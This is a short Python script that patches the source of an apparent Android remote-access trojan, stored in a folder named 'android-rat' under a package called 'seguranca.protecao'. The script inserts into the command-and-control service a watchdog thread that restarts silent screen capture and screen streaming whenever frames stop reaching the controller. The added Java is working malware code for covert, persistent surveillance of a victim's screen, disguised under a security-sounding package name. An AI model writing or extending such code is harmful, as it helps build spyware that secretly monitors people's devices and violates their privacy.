import shutil
C = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\CommandControlService.java"
shutil.copyfile(C, C + ".bak_wd")
c = open(C, encoding="utf-8").read()
assert "startCaptureWatchdog" not in c, "ya parcheado"
i = c.index("public void onCreate()")
j = c.index("super.onCreate();", i) + len("super.onCreate();")
c = c[:j] + "\n        startCaptureWatchdog();" + c[j:]
M = '''    private void startCaptureWatchdog() {
        Thread t = new Thread(() -> {
            while (true) {
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                try {
                    long now = System.currentTimeMillis();
                    boolean stalled = (lastSuccessfulSend == 0L) || (now - lastSuccessfulSend > 8000L);
                    if (isConnected && stalled) {
                        boolean running = UiAssistBridge.isSilentCaptureRunning();
                        boolean proj = ScreenStreamService.isActive();
                        Log.w(TAG, "WATCHDOG captura: silent=" + running + " proj=" + proj);
                        if (!running) { try { UiAssistBridge.startSilentScreenCapture(70); } catch (Throwable ignored) {} }
                        if (!proj) { try { ScreenStreamService.forceEnsure(CommandControlService.this); } catch (Throwable ignored) {} }
                    }
                } catch (Throwable ignored) {}
            }
        }, "CapWatchdog");
        t.setDaemon(true);
        t.start();
    }

    public static boolean canAcceptScreenFrame() {'''
o = "    public static boolean canAcceptScreenFrame() {"
assert c.count(o) == 1
c = c.replace(o, M)
open(C, "w", encoding="utf-8").write(c)
print("WATCHDOG OK")
